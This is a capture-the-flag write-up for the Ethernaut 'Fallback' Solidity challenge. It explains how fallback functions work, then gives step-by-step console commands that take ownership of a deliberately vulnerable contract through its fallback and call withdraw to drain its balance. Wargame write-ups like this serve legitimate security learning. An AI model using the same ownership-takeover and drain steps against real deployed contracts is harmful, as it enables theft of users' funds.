# Level 1 Fallback

Challenge URL = https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7

# Fallback Function Background Info 
Defined
Each contract may have a single function that has been unnamed.  This is considered to be the fallback function.  

Constraints
It cannot have any arguements nor return anything.  You can use msg.data to retrieve payload supplied with the call.
To Recieve ether it must be marked as "payable" 
If no "payable" function, contract cant recieve ETH via regular transactions
Fallback function should cost no more than 2300 gas.  Make them as cheap as possible, test & verify cost.
Some Operations consume A LOT of gas so try not to use them in the fallback function
-Contract Creation
-Sending Ether
-Writing to storage
-External call that requires a lot of gas


Execution
Are executed if 
1.  Contract is called and no other function matches the specified function identifier or no data supplied
or 
2.  Contract recieves plain ether without any data. 
 



# problem

-function contriubute() public payable
    Looks like the author wanted the owner to only be replaced if a contributor sends more than the current owner.  
-The problem comes with the fallback function.  It lets a sender become the owner  of the contract.  To do this the  given that the transaction has any ether >0 and that the sender has made a contribution in the past. 

# Solution

1.  Send 1 wei to 'function contribute() public payable'
await contract.contribute({ value: 1 })
await contract.getContribution().toString()
2.  Send 1 wei to the fallback function 'await contract.sendTransaction({ value: 1 })
3.  Verify that you are the owner await contract.owner()
4.  Call the withdraw function and drain the contract of it's balance
contract.withdraw()
5.  Submit the instance




